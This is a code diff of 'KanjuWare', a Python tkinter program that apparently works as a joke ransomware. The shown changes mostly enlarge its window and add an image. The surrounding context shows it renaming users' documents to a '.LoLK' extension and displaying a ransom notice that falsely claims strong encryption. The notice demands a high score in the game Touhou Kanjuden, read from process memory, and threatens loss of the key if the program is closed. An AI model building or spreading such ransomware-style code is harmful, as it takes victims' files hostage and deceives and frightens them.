@@ -8,11 +8,22 @@ import threading
 import tkinter as tk
 from tkinter import messagebox
 from pymem import Pymem
+from PIL import Image, ImageTk 
+
+def resource_path(relative_path):
+    """ Get absolute path to resource, works for dev and for PyInstaller """
+    try:
+        # PyInstaller creates a temp folder and stores path in _MEIPASS
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
 
 # ==================== Configuration ====================
 TARGET_SCORE = 5000000 # The target score is set to 5 million (5000000) instead of 50 million because the score in memory is actually the displayed score divided by 10. This is a common practice in games to save memory and simplify score handling. So when the player reaches 50 million points, the value stored in memory will be 5 million (5000000). Therefore, we set TARGET_SCORE to 5000000 to correctly detect when the player has reached the required score for unlocking the files.
 SCORE_ADDRESS = 0x004E40BC # This is the memory address where the score is stored in the trial version of Touhou Kanjuden. For the full version, the score is stored at 0x004E740C. The program will automatically detect which version is running and read the score from the correct address.
 TARGET_EXTENSION = ".LoLK" # This is the extension that will be appended to files to simulate encryption. When the program "encrypts" a file, it will rename the file to have this extension. For example, "document.pdf" would be renamed to "document.pdf.LoLK". This allows for easy recovery by simply removing the ".LoLK" extension from the file name.
+IMAGE_PATH = resource_path("assets/junko.png") # This is the path to the image file that will be displayed in the GUI. The image is used to enhance the visual presentation of the application, making it more engaging for the user. The image should be placed in the specified path relative to the main.py file.
 FILE_EXTENSIONS_NEED_TO_RENAME = {
     ".pdf", ".txt", ".md", ".json", ".doc", ".docx", ".odt", ".wps",
     ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".tsv", ".sql", ".db", ".mdb", ".accdb", ".odp", ".ods",
@@ -69,8 +80,8 @@ class KanjuWareApp:
     def __init__(self, root):
         scale = get_scale_factor()
         self.root = root
-        self.root.title("KanjuWare v1.12 - Pure Mutation")
-        BASE_W, BASE_H = 500, 400
+        self.root.title("KanjuWare v1.14 - Pure Mutation")
+        BASE_W, BASE_H = 940, 600
         self.root.geometry(f"{int(BASE_W * scale)}x{int(BASE_H * scale)}")
         self.root.resizable(False, False)
         
@@ -93,12 +104,33 @@ class KanjuWareApp:
             
             title_label = tk.Label(
                 self.root, 
-                text="【WARNING】Your computer has been infected!", 
-                font=("Consolas", 14, "bold"), 
+                text="[WARNING] Your computer has been infected!", 
+                font=("Consolas", 18, "bold"), 
                 fg="#ff4757", bg="#1a1a2e"
             )
-            title_label.pack(pady=15)
+            title_label.pack(pady=(15, 5))
+
+            body_frame = tk.Frame(self.root, bg="#1a1a2e")
+            body_frame.pack(fill="both", expand=True, padx=10, pady=5)
             
+            left_frame = tk.Frame(body_frame, bg="#1a1a2e", width=399 * scale)
+            left_frame.pack(side="left", fill="y", padx=(0, 10))
+            left_frame.pack_propagate(False)  # Prevent the frame from resizing to fit its content
+
+            try:
+                image = Image.open(IMAGE_PATH)
+                image = image.resize((int(399 * scale), int(512 * scale)), Image.LANCZOS)
+                self.image_tk = ImageTk.PhotoImage(image)
+                image_label = tk.Label(left_frame, image=self.image_tk, bg="#1a1a2e")
+                image_label.pack(pady=5)
+            except Exception as e:
+                placeholder = tk.Label(left_frame, text="[Image not found]", font=("Consolas", 12), fg="#ffffff", bg="#1a1a2e")
+                placeholder.pack(expand=True)
+                print(f"[Error] Failed to load image: {e}")
+
+            right_frame = tk.Frame(body_frame, bg="#1a1a2e")
+            right_frame.pack(side="right", fill="both", expand=True)
+
             instruction_text = (
                 "Oops, your file has been infected by \"Pure Mutation\"!\n\n"
                 "What the HELL is it?\n"
@@ -108,14 +140,14 @@ class KanjuWareApp:
                 "\"high-strength encryption algorithm with a random key.\"\n\n"
                 "How can I recover my file?\n"
                 "That's easy, you just need to reach 50 million points in any difficulty "
-                "in the \"Touhou Kanjuden Trial\" version, and this program will automatically "
-                "detect the process and score of \"Touhou Kanjuden Trial\". If you do not "
+                "in the \"Touhou Kanjuden\" Trial or Full version, and this program will automatically "
+                "detect the process and score of \"Touhou Kanjuden\". If you do not "
                 "want to lose your encryption key, do not attempt to deceive or close this program."
             )
             
             msg_label = tk.Label(
-                self.root, text=instruction_text, 
-                font=("Consolas", 9), 
+                right_frame, text=instruction_text, 
+                font=("Consolas", 12), 
                 fg="#ffffff", bg="#1a1a2e", justify="left",
                 wraplength=440 * scale
             )
@@ -143,7 +175,7 @@ class KanjuWareApp:
             score_val.pack(side="right", padx=20, pady=5)
 
             # Backdoor. Double-click the invisible label to trigger cheat unlock (for testing and emergency recovery)
-            backdoor_btn = tk.Label(self.root, text=".", fg="#1a1a2e", bg="#1a1a2e")
+            backdoor_btn = tk.Label(right_frame, text=".", fg="#1a1a2e", bg="#1a1a2e")
             backdoor_btn.pack(side="bottom", anchor="se")
             backdoor_btn.bind("<Double-Button-1>", self.cheat_unlock)
 
